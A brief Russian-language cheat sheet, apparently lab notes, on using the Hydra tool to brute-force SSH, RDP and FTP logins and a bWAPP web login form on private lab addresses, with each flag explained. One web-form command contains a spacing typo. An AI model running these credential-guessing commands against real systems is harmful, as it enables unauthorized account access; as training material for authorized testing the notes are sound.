# Hydra

Написан на C

git: [https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)

Hydra\
\=====\
1\. brute ssh:\
hydra -V -L login -P pass -f [ssh://192.168.10.10](ssh://192.168.10.10)\
\-V отображение перебора в командной строке\
\-L список с логинами;\
\-P список с паролями;\
\-f остановка брута после нахождения успешной комбинации.\
ssh сам хост.\
2\. brute rdp:\
RDP - протокол удаленного управления для винды. Port по умолчанию: 3389\
hydra -t 4 -V -L login -P pass -f [rdp://192.168.10.10](rdp://192.168.10.10)\
\-t количество потоков\
3\. brute ftp\
Для передачи файлов по сети используется протокол FTP. Стандартный порт — 21\
hydra -s 211 -t 4 -V -L login -P pass -f 192.168.30.30\
\-s - указать порт, если исп не по умолчанию\
4\. brute web forms\
hydra -V -L login - P pass -f 192.168.10.20 http-post-form -m "/bWAPP/login.php:login=^USER^\&password=^PASS^\&security\_level=0\&form=submit: F=Invalid credentials"\
http-post-form указываем тип формы (Request Method);\
\-m "указываем путь к форме:саму форму:F=Ошибка, при вводе неправильного пароля"
